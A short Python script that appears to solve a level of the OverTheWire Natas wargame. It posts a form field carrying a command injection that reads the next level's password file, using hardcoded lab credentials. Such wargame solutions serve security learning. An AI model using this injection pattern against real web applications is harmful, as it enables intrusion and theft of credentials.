import requests

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
response = session.post(url, data={
                        "needle": '; cat /etc/natas_webpass/natas10 #', "submit": "submit"}, auth=(username, password))
content = response.text

print(content)
